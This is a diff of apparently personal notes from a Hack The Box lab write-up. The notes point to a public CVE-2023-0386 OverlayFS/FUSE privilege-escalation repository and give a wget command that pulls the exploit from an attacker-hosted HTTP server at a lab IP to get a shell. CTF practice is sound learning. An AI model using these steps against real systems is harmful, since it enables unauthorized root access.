@@ -167,9 +167,6 @@ HTB Godfather
 
 in the mail it says overlayFS / FUSE
 
-```
-
-
 search for the cve
 https://github.com/puckiestyle/CVE-2023-0386
 
@@ -180,5 +177,5 @@ git clone the cve file then run python http server on it then run this command t
 wget -r --no-parent http://10.10.16.4:8000/CVE-2023-0386
 
 ```
+
 then follow the github instructions and now you have a shell
-```
